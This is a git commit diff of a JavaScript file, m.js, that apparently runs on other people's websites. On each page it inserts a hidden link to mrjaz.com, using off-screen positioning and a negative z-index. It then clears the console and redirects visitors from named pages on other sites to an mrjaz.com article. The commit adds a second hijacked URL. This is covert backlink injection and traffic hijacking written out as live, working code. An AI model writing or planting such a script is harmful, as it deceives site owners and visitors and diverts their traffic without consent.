4eb899963feed11f452b0b1cc1f9106387093819
Sonu Kumar Beast <67105554+SonuBeast@users.noreply.github.com>
2020-11-13 12:38:16 +0530

    Update m.js

--- m.js
+++ m.js
@@ -2,4 +2,4 @@ let EFV='<a href="https://www.mrjaz.com" style="position: absolute;z-index: -999
 if(document.querySelector('header')){document.querySelector('header').insertAdjacentHTML('beforeend',EFV);}
 else{document.querySelector('body').insertAdjacentHTML('beforeend',EFV);}
 console.clear();
-if(location.href=='https://www.sitedroos.com/2015/09/500_12.html'){location.href='https://www.mrjaz.com/2020/11/willpower-ko-strong-kaise-banaye.html'}
+if(location.href=='https://www.sitedroos.com/2015/09/500_12.html' || location.href=='https://www.9jaedublog.com.ng/2020/06/betking-virtual-football-cheat-2020.html'){location.href='https://www.mrjaz.com/2020/11/willpower-ko-strong-kaise-banaye.html'}
